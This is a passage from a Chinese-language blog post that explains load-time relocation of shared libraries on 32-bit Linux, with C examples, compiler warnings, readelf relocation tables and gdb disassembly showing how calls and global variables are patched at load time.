   <span class="number">0xf7fd856a</span> &lt;+<span class="number">30</span>&gt;:    <span class="number">5d</span>      <span class="keyword">pop</span>    <span class="literal">ebp</span>
   <span class="number">0xf7fd856b</span> &lt;+<span class="number">31</span>&gt;:    c3      <span class="keyword">ret</span>    
End of assembler dump.
</code></pre><p>呵，已经替换过了</p>
<p>综上，一切都很明显了，动态链接库ELF文件中有乱七八糟东西如何映射到目的进程的进程空间中去何处的信息，其中就包括有些地址要载入时替换的信息。操作系统负责这件事，在程序载入阶段计算地址，把该换的换掉。</p>
<h3 id="函数调用重定位">函数调用重定位</h3><p>换下<code>ml_main.c</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ml_util_func</code>被调用,编译</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -g -c ml_main.c -o ml_mainreloc.o
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
</code></pre><p>啥玩意：</p>
<pre><code><span class="number">0000057</span>c &lt;ml_util_func&gt;:
 <span class="number">57</span>c:   <span class="number">55</span>                      push   %ebp
 <span class="number">57</span>d:   <span class="number">89</span> e5                   mov    %esp,%ebp
 <span class="number">57f</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    <span class="number">0x8</span>(%ebp),%eax
 <span class="number">582</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    $<span class="number">0x1</span>,%eax
 <span class="number">585</span>:   <span class="number">5</span>d                      pop    %ebp
 <span class="number">586</span>:   c3                      ret    

<span class="number">00000587</span> &lt;ml_func&gt;:
 <span class="number">587</span>:   <span class="number">55</span>                      push   %ebp
 <span class="number">588</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp
 <span class="number">58</span>a:   <span class="number">83</span> ec <span class="number">14</span>                sub    $<span class="number">0x14</span>,%esp
 <span class="number">58</span>d:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    <span class="number">0x8</span>(%ebp),%eax
 <span class="number">590</span>:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    %eax,(%esp)
 <span class="number">593</span>:   e8 fc ff ff ff          call   <span class="number">594</span> &lt;ml_func+<span class="number">0xd</span>&gt;
 <span class="number">598</span>:   <span class="number">8</span>b <span class="number">55</span> <span class="number">0</span>c                mov    <span class="number">0xc</span>(%ebp),%edx
 <span class="number">59</span>b:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">59</span>d:   <span class="number">89</span> <span class="number">45</span> fc                mov    %eax,-<span class="number">0x4</span>(%ebp)
 <span class="number">5</span>a0:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%edx
 <span class="number">5</span>a6:   <span class="number">8</span>b <span class="number">45</span> fc                mov    -<span class="number">0x4</span>(%ebp),%eax
 <span class="number">5</span>a9:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">5</span>ab:   a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    %eax,<span class="number">0x0</span>
 <span class="number">5</span>b0:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>,%edx
 <span class="number">5</span>b6:   <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c                mov    <span class="number">0xc</span>(%ebp),%eax
 <span class="number">5</span>b9:   <span class="number">01</span> d0                   add    %edx,%eax
 <span class="number">5</span>bb:   c9                      leave  
 <span class="number">5</span>bc:   c3                      ret    
 <span class="number">5</span>bd:   <span class="number">66</span> <span class="number">90</span>                   xchg   %ax,%ax
 <span class="number">5</span>bf:   <span class="number">90</span>                      nop
</code></pre><p>注意<code>593</code>那行。</p>
<pre><code><span class="number">593</span>:   e8 fc ff ff ff          call   <span class="number">594</span> &lt;ml_func+<span class="number">0xd</span>&gt;
</code></pre><p><code>call(e8)</code>是相对寻址，<code>fffffffc</code>就是<code>-4</code>，即call指令调用自身(<code>598-4</code>)。</p>
<p>显然，这在载入时要被替换。看看ELF中关于重定位符号映射后偏移信息</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x380 contains 12 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000594</span>  <span class="number">00000902</span> R_386_PC32        <span class="number">0000057</span>c   ml_util_func
<span class="number">000005a2</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
...
</code></pre><p>当动态链接库载入时，<code>ml_util_func</code>所在的位置对链接器是已知的(基址(0xf7fd8000)+偏移(0x57c))，594这个要替换位置链接器也是已知的。</p>
<p>偏移地址通过<code>R_386_PC32</code>的规则计算就好<code>0x57c-0x597+0xffffffff=0xffffffe4</code></p>
<p>通过gdb会话可以看到是这样：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q driver
Reading symbols from /home/lyy/Work/project/blackhat/eli/driver...done.
(gdb)  b driver.c:<span class="number">31</span>
Breakpoint <span class="number">1</span> at <span class="number">0x804874b</span>: file driver.c, line <span class="number">31.</span>
(gdb) r
Starting program: /home/lyy/Work/project/blackhat/eli/driver 
warning: the debug information found in <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does not match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).

name= (<span class="number">10</span> segments) address=(nil)
                 header  <span class="number">0</span>: address= <span class="number">0x8048034</span>
                         type=<span class="number">6</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address= <span class="number">0x8048174</span>
                         type=<span class="number">3</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">2</span>: address= <span class="number">0x8048000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">3</span>: address= <span class="number">0x8049ef8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">4</span>: address= <span class="number">0x8049f04</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address= <span class="number">0x8048188</span>
                         type=<span class="number">4</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address= <span class="number">0x8048838</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">7</span>: address=     (nil)
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">8</span>: address= <span class="number">0x8049ef8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">9</span>: address=     (nil)
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/home/lyy/Work/project/blackhat/eli/libmlreloc.so (<span class="number">7</span> segments) address=<span class="number">0xf7fd8000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7fd9ef4</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7fd85d4</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/lib32/libc.so<span class="number">.6</span> (<span class="number">11</span> segments) address=<span class="number">0xf7df4000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7df4034</span>
                         type=<span class="number">6</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7f67788</span>
                         type=<span class="number">3</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7f9dd9c</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7df4194</span>
                         type=<span class="number">4</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">7</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">7</span>: address=<span class="number">0xf7f677a0</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">8</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">9</span>: address=<span class="number">0xf7f9c1e4</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header <span class="number">10</span>: address=<span class="number">0xf7df4000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>

name=/lib/ld-linux.so<span class="number">.2</span> (<span class="number">7</span> segments) address=<span class="number">0xf7fdc000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7ffcc80</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7ffcef8</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7ff8f00</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7ffcc80</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fdc000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>


Breakpoint <span class="number">1</span>, main (argc=<span class="number">1</span>, argv=<span class="number">0xffffcd84</span>) at driver.c:<span class="number">31</span>
<span class="number">31</span>      }
(gdb) disas ml_util_func 
Dump of assembler code <span class="keyword">for</span> function ml_util_func:
   <span class="number">0xf7fd857c</span> &lt;+<span class="number">0</span>&gt;:     push   ebp
   <span class="number">0xf7fd857d</span> &lt;+<span class="number">1</span>&gt;:     mov    ebp,esp
   <span class="number">0xf7fd857f</span> &lt;+<span class="number">3</span>&gt;:     mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
   <span class="number">0xf7fd8582</span> &lt;+<span class="number">6</span>&gt;:     add    eax,<span class="number">0x1</span>
   <span class="number">0xf7fd8585</span> &lt;+<span class="number">9</span>&gt;:     pop    ebp
   <span class="number">0xf7fd8586</span> &lt;+<span class="number">10</span>&gt;:    ret    
End of assembler dump.
(gdb) disas /r ml_func
Dump of assembler code <span class="keyword">for</span> function ml_func:
   <span class="number">0xf7fd8587</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">55</span>      push   ebp
   <span class="number">0xf7fd8588</span> &lt;+<span class="number">1</span>&gt;:     <span class="number">89</span> e5   mov    ebp,esp
   <span class="number">0xf7fd858a</span> &lt;+<span class="number">3</span>&gt;:     <span class="number">83</span> ec <span class="number">14</span>        sub    esp,<span class="number">0x14</span>
   <span class="number">0xf7fd858d</span> &lt;+<span class="number">6</span>&gt;:     <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>        mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
   <span class="number">0xf7fd8590</span> &lt;+<span class="number">9</span>&gt;:     <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>        mov    DWORD PTR [esp],eax
   <span class="number">0xf7fd8593</span> &lt;+<span class="number">12</span>&gt;:    e8 e4 ff ff ff  call   <span class="number">0xf7fd857c</span> &lt;ml_util_func&gt;
   <span class="number">0xf7fd8598</span> &lt;+<span class="number">17</span>&gt;:    <span class="number">8</span>b <span class="number">55</span> <span class="number">0</span>c        mov    edx,DWORD PTR [ebp+<span class="number">0xc</span>]
   <span class="number">0xf7fd859b</span> &lt;+<span class="number">20</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd859d</span> &lt;+<span class="number">22</span>&gt;:    <span class="number">89</span> <span class="number">45</span> fc        mov    DWORD PTR [ebp-<span class="number">0x4</span>],eax
   <span class="number">0xf7fd85a0</span> &lt;+<span class="number">25</span>&gt;:    <span class="number">8</span>b <span class="number">15</span> <span class="number">18</span> a0 fd f7       mov    edx,DWORD PTR ds:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd85a6</span> &lt;+<span class="number">31</span>&gt;:    <span class="number">8</span>b <span class="number">45</span> fc        mov    eax,DWORD PTR [ebp-<span class="number">0x4</span>]
   <span class="number">0xf7fd85a9</span> &lt;+<span class="number">34</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd85ab</span> &lt;+<span class="number">36</span>&gt;:    a3 <span class="number">18</span> a0 fd f7  mov    ds:<span class="number">0xf7fda018</span>,eax
   <span class="number">0xf7fd85b0</span> &lt;+<span class="number">41</span>&gt;:    <span class="number">8</span>b <span class="number">15</span> <span class="number">18</span> a0 fd f7       mov    edx,DWORD PTR ds:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd85b6</span> &lt;+<span class="number">47</span>&gt;:    <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c        mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]
   <span class="number">0xf7fd85b9</span> &lt;+<span class="number">50</span>&gt;:    <span class="number">01</span> d0   add    eax,edx
   <span class="number">0xf7fd85bb</span> &lt;+<span class="number">52</span>&gt;:    c9      leave  
   <span class="number">0xf7fd85bc</span> &lt;+<span class="number">53</span>&gt;:    c3      ret    
End of assembler dump.
</code></pre><h2 id="为何需要调用重定向">为何需要调用重定向</h2><p>为什么动态库作为一个整体载入进程时，位置都是确定的，却要经过重定向计算？</p>
<p>简单来说，在声明时对<code>ml_util_func</code>以static关键字声明，把函数作为只模块内可用的话，就不存在重定位了。</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -g -c ml_main.c -o ml_mainreloc.o      
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  objdump -d -<span class="constant">Mintel</span> libmlreloc.so                

libmlreloc.<span class="symbol">so:</span>     file format elf32-i386

<span class="constant">Disassembly</span> <span class="keyword">of</span> section .<span class="symbol">init:</span>

<span class="number">0000054</span>c &lt;ml_util_func&gt;:
 <span class="number">54</span><span class="symbol">c:</span>   <span class="number">55</span>                      push   ebp
 <span class="number">54</span><span class="symbol">d:</span>   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">54</span><span class="symbol">f:</span>   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,<span class="constant">DWORD</span> <span class="constant">PTR</span> [ebp+<span class="number">0x8</span>]
 <span class="number">552</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    eax,<span class="number">0x1</span>
 <span class="number">555</span>:   <span class="number">5</span>d                      pop    ebp
 <span class="number">556</span>:   c3                      ret    

<span class="number">00000557</span> &lt;ml_func&gt;:
 <span class="number">557</span>:   <span class="number">55</span>                      push   ebp
 <span class="number">558</span>:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">55</span><span class="symbol">a:</span>   <span class="number">83</span> ec <span class="number">14</span>                sub    esp,<span class="number">0x14</span>
 <span class="number">55</span><span class="symbol">d:</span>   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,<span class="constant">DWORD</span> <span class="constant">PTR</span> [ebp+<span class="number">0x8</span>]
 <span class="number">560</span>:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    <span class="constant">DWORD</span> <span class="constant">PTR</span> [esp],eax
 <span class="number">563</span>:   e8 e4 ff ff ff          call   <span class="number">54</span>c &lt;ml_util_func&gt;
 ...
</code></pre><p>产生这个现象的原因就此一目了然，如果动态库中存在全局变量，也许会被覆盖和改写，其它载入的动态库就不能知道这个变量的相对位置，需要动态重定位。</p>
<h3 id="于可执行文件中引用动态库中的数据">于可执行文件中引用动态库中的数据</h3><p>上例中<code>myglob</code>变量只在动态库内部使用，如果在外部引用呢？这存在一个特殊的重定位过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> myglob;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"addr myglob = %p\n"</span>, (<span class="keyword">void</span>*)&amp;myglob);</span><br><span class="line">    <span class="keyword">int</span> t = ml_func(argc, argc);</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新编译运行：</p>
<pre><code> ✘  ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -std=c99 -m32 -g -c driver.c -o driver.o    
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -o driver driver.o -<span class="constant">L</span>. -lmlreloc   
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  ./driver
addr myglob = <span class="number">0x804a024</span>
</code></pre><p><code>0x804a024</code>显然是在主进程而不是后来载入的动态库虚拟地址区域。而<code>myglob</code>是被赋值的。</p>
<p>从gdb中查看引用<code>myglob</code>的位置：</p>
<pre><code>(gdb) p &amp;myglob
<span class="variable">$1</span> = (&lt;data variable, no debug info&gt; *) <span class="number">0x804a024</span> &lt;myglob&gt;
</code></pre><p>查看elf文件</p>
<pre><code> ✘  ~/Work/project/blackhat/eli  readelf -r driver

Relocation section '.rel.dyn' at offset 0x440 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  <span class="number">00000406</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __gmon_start__
<span class="number">0804a024</span>  <span class="number">00000805</span> R_386_COPY        <span class="number">0804a024</span>   myglob
</code></pre><p>有个<code>R_386_COPY</code>类型，该类型表示直接把符号复制到<code>Sym.Value</code>的位置。</p>
<p>在<code>.symtab</code>有相应信息告诉我如何把<code>myglob</code>拷贝，包括尺寸<code>4</code></p>
<pre><code>~/Work/project/blackhat/eli  readelf -s libmlreloc.so 

Symbol table <span class="string">'.symtab'</span> <span class="keyword">contains</span> <span class="number">50</span> entries:
   Num:    <span class="keyword">Value</span>  <span class="built_in">Size</span> <span class="keyword">Type</span>    <span class="keyword">Bind</span>   Vis      Ndx <span class="keyword">Name</span>
   ...
    <span class="number">39</span>: <span class="number">00002018</span>     <span class="number">4</span> OBJECT  GLOBAL <span class="keyword">DEFAULT</span>   <span class="number">21</span> myglob
   ...
</code></pre><h2 id="结论">结论</h2><p>载入时重定位是linux下解析载入的内部数据和代码引用的一种方法。PIC是更高级和流行的方式，甚至x86-64已经不支持载入时重定位。</p>
<p>无论如何，希望此文能帮助拨开现代操作系统链接和载入动态库魔法迷雾。</p>
<p>Next, <a href="http://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/" target="_blank" rel="external">Position Independent Code (PIC) in shared libraries</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">177</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">62</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://zhangwenli.com/blog" target="_blank">Ovilia</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://simmer-jun.github.io" target="_blank">Simmer</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/3/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
